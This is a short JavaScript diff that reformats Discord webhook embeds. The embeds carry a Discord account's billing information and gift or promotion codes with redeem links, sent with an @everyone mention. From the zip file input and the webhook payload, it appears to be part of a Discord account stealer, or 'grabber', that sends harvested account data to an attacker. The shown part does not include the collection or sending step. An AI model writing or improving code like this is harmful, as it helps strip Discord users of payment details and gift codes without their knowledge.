@@ -132,19 +132,12 @@ const json = async (zipFile) => {
   }); }) : embeds.push({
     title: 'Discord Account - Billing', description: 'No Billing'
   });
-  discordAccountInfo.gifts.forEach(gift => { embeds.push({
-    title: `Discord Account - Promotion - ${gift.promotion.outbound_title}`,
-    description: gift.promotion.outbound_redemption_modal_body,
-    fields: [
-      ['ID', gift.promotion.id],
-      ['Start Date', `<t:${Math.floor(moment(gift.promotion.start_date).utc().valueOf() / 1000)}:f>`],
-      ['End Date', `<t:${Math.floor(moment(gift.promotion.end_date).utc().valueOf() / 1000)}:f>`],
-      ['Claimed At', `<t:${Math.floor(moment(gift.claimed_at).utc().valueOf() / 1000)}:f>`],
-      ['Code', `\`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`],
-      ['User ID', gift.user_id]
-    ].map(f => { return { name: f[0], value: f[1], inline: true }; })
-  }); });
-
+  embeds.push({
+    title: 'Discord Account - Promotions',
+    description: discordAccountInfo.gifts.map(gift => {
+      return `**${gift.promotion.outbound_title}** - \`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`;
+    }).join('')
+  });
   return {
     content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
     attachments: [
